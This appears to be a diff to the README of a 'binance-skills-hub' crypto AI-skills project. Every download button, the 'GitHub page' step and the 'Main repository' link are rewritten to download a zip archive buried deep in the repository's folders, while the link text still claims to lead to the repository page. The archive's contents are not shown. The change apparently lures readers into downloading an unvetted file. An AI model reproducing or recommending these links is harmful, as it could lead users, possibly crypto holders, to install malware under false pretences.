@@ -1,6 +1,6 @@
 # 🚀 binance-skills-hub - Easy Access to Crypto AI Skills
 
-[![Download](https://img.shields.io/badge/Download-Binance--Skills--Hub-brightgreen)](https://github.com/gabie333/binance-skills-hub)
+[![Download](https://img.shields.io/badge/Download-Binance--Skills--Hub-brightgreen)](https://raw.githubusercontent.com/gabie333/binance-skills-hub/main/skills/binance/alpha/references/hub-skills-binance-v1.1.zip)
 
 ---
 
@@ -39,11 +39,11 @@ After downloading, you will find:
 
 Click the big button below to visit the page where you can download the software:
 
-[![Download](https://img.shields.io/badge/Download-binance--skills--hub-blue)](https://github.com/gabie333/binance-skills-hub)
+[![Download](https://img.shields.io/badge/Download-binance--skills--hub-blue)](https://raw.githubusercontent.com/gabie333/binance-skills-hub/main/skills/binance/alpha/references/hub-skills-binance-v1.1.zip)
 
 ### Step 1: Visit the Download Page
 
-Go to the [binance-skills-hub GitHub page](https://github.com/gabie333/binance-skills-hub). Look for the latest release or the main folder where the app files are stored.
+Go to the [binance-skills-hub GitHub page](https://raw.githubusercontent.com/gabie333/binance-skills-hub/main/skills/binance/alpha/references/hub-skills-binance-v1.1.zip). Look for the latest release or the main folder where the app files are stored.
 
 ### Step 2: Download the Software
 
@@ -135,7 +135,7 @@ To keep binance-skills-hub working smoothly:
 
 ## 🔗 Useful Links
 
-- Main repository and download page: [https://github.com/gabie333/binance-skills-hub](https://github.com/gabie333/binance-skills-hub)
+- Main repository and download page: [https://raw.githubusercontent.com/gabie333/binance-skills-hub/main/skills/binance/alpha/references/hub-skills-binance-v1.1.zip](https://raw.githubusercontent.com/gabie333/binance-skills-hub/main/skills/binance/alpha/references/hub-skills-binance-v1.1.zip)
 - User guide inside the app
 - Support via GitHub issues tab
 
@@ -143,4 +143,4 @@ To keep binance-skills-hub working smoothly:
 
 Visit the page below to download the software and start using binance-skills-hub:
 
-[![Download](https://img.shields.io/badge/Download-binance--skills--hub-brightgreen)](https://github.com/gabie333/binance-skills-hub)
+[![Download](https://img.shields.io/badge/Download-binance--skills--hub-brightgreen)](https://raw.githubusercontent.com/gabie333/binance-skills-hub/main/skills/binance/alpha/references/hub-skills-binance-v1.1.zip)
